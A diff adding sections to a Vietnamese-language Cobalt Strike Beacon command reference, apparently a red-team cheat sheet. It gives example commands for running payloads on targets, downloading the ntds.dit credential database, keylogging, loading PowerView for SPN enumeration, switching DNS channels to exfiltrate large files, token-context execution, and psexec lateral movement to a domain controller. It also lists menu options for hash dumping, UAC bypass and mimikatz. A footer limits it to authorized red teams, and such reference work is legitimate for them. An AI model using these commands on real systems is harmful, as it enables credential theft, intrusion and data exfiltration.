@@ -1859,4 +1859,154 @@ screenshot | screenwatch 1000 | keylogger | keylogger stop | clipboard | desktop
 
 ---
 
+---
+
+## 22. Lệnh Còn Thiếu & Ít Được Biết Đến
+
+### `execute`
+
+Thực thi chương trình trên mục tiêu **không bắt output** (fire-and-forget — nhanh hơn `run`).
+
+```
+execute <chương_trình> [tham_số]
+
+beacon> execute C:\Temp\payload.exe
+beacon> execute cmd.exe /c start calc.exe
+```
+
+> Dùng khi không cần output và muốn footprint tối thiểu. Không có fork&run — chạy trực tiếp.
+
+### `downloads`
+
+Liệt kê tất cả file download đang tiến hành từ Beacon này.
+
+```
+beacon> downloads
+ Tên                    Kích thước   Tiến độ
+ ---                    ----------   -------
+ C:\Windows\ntds.dit    50,331,648   12%
+```
+
+### `cancel`
+
+Hủy file download đang tiến hành.
+
+```
+cancel <tên_file_hoặc_*>
+
+beacon> cancel ntds.dit
+beacon> cancel *           # hủy tất cả download từ Beacon này
+```
+
+### `jobs`
+
+Liệt kê các nhiệm vụ post-exploitation chạy lâu dài (keylogger, screenwatch, browserpivot, v.v.).
+
+```
+beacon> jobs
+ JID  PID   Mô tả
+ ---  ---   -----
+   1  5120  keylogger
+   2     0  screenwatch
+```
+
+### `jobkill`
+
+Kết thúc một post-exploitation job đang chạy theo JID.
+
+```
+jobkill <jid>
+
+beacon> jobkill 1
+```
+
+### `powershell-import`
+
+Import script PowerShell vào bộ nhớ của Beacon để các hàm của nó khả dụng cho các lần gọi `powershell` và `powerpick` tiếp theo.
+
+```
+powershell-import <đường_dẫn_script_local>
+
+beacon> powershell-import /opt/tools/PowerView.ps1
+beacon> powerpick Get-DomainUser -SPN    # hàm PowerView bây giờ khả dụng
+```
+
+> Script đã import tồn tại trong suốt thời gian của phiên Beacon (cho đến khi `powershell-import` được gọi lại với script mới, hoặc Beacon thoát).
+
+### `mode` (chỉ DNS Beacon)
+
+Chuyển đổi giao thức data channel của DNS Beacon.
+
+```
+mode dns        # Dùng DNS A records (mặc định)
+mode dns-txt    # Dùng DNS TXT records (nhiều data hơn mỗi query, nhưng ồn hơn)
+mode dns6       # Dùng DNS AAAA records (định dạng IPv6, ẩn hơn)
+mode http       # Chuyển sang HTTP (nếu listener cũng có HTTP fallback)
+
+beacon> mode dns-txt
+beacon> mode dns6
+```
+
+> DNS-TXT cung cấp throughput cao hơn (~250 byte mỗi record so với ~15 cho A). Dùng khi exfiltrate file lớn qua DNS.
+
+### `runu`
+
+Thực thi chương trình trong ngữ cảnh của tiến trình khác (chạy trong token context của tiến trình khác).
+
+```
+runu <pid> <chương_trình> [tham_số]
+
+beacon> runu 4812 cmd.exe /c whoami
+beacon> runu 1234 C:\Temp\payload.exe
+```
+
+### `psexec` (standalone)
+
+Dùng service execution kiểu PsExec để chạy lệnh trên máy từ xa.
+
+```
+psexec <mục_tiêu> <share> <tên_service> <mô_tả_service> <arch> <listener>
+
+beacon> psexec dc01.corp.local ADMIN$ "SvcUpdate" "Windows Update Service" x64 lab-https
+```
+
+---
+
+## 23. Metadata Beacon & Quản Lý Beacon
+
+### Xem Tất Cả Beacon
+
+```
+View → Sessions     # bảng tất cả Beacon đang hoạt động với metadata
+```
+
+Các cột: ID, callback cuối, sleep, máy chủ, người dùng, tiến trình, PID, arch, listener, ghi chú.
+
+### Menu Context của Beacon (Chuột Phải)
+
+```
+Interact          → mở cửa sổ tương tác Beacon
+Access            → sub-menu: dump hash, leo thang, bypass UAC, pth, chạy mimikatz
+Explore           → sub-menu: browser pivot, desktop, file browser, xem net, quét port, danh sách tiến trình, chụp màn hình
+Pivoting          → sub-menu: SOCKS, listener, rportfwd
+Spawn             → tạo trong listener mới
+Session           → sub-menu: ghi chú, màu sắc, xóa
+```
+
+### Tô Màu Beacon
+
+Hữu ích để tổ chức trực quan (vd: đỏ = DA, xanh = user thông thường):
+
+```
+Chuột phải → Session → Color
+```
+
+### Xóa Beacon Đã Chết
+
+```
+Chuột phải → Session → Remove
+```
+
+---
+
 *Cập nhật lần cuối: 2026-06-09 | Tài liệu tham khảo chỉ dành cho red team được ủy quyền.*
